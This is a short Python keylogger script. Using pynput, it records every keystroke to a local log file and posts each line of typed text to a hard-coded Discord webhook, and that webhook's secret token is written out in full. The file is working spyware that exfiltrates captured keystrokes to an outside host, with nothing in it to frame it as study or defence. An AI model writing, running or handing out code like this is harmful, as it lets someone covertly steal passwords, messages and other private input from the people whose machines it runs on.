from pynput import keyboard
from datetime import datetime
import requests

LOG_FILE = "log.txt"
SEND_FILE = "sent_log.txt"


WEBHOOK_URL = "https://discord.com/api/webhooks/1389203274636202134/kV606ux_3rtP5bbgBH3dshcmIDnysc5bVkysSC9v725QAThSg-lkG7NaoUzqCN-03l0p"
buffer = []

def send_to_discord(message):
    payload = {
        "content": f"[keylogger] {message}"
    }
    try:
        response = requests.post(WEBHOOK_URL, json=payload)
        if response.status_code != 204:
            print("Discord webhook error: ", response.status_code)
        
    except Exception as e:
        print("Sendind error", e)

def write_to_main_log(key_str):
    time = datetime.now().strftime("%D-%M-%Y, %H:%M:%D")
    with open(LOG_FILE, "a", encoding="utf-8") as f:
        f.write(f"[{time}] {key_str}\n")
        
def send_buffer():
    global buffer
    message = ''.join(buffer).strip()
    if message:
        print(f"Sending: {message}")
        send_to_discord(message)  # ← tu faktyczna wysyłka
    buffer = []
            
        
def on_press(key):
    try:
        key_str = key.char
        buffer.append(key_str)
        write_to_main_log(key_str)
    except AttributeError:
        if key == keyboard.Key.space:
            buffer.append(' ')
            write_to_main_log(' ')
        elif key == keyboard.Key.enter:
            buffer.append('\n')
            write_to_main_log('[ENTER]')
            send_buffer()  #sending after enter
        else:
            write_to_main_log(str(key))
    
def on_release(key):
    if key == keyboard.Key.esc: #esc key stops the program
        print("Exiting...")
        return False  

with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
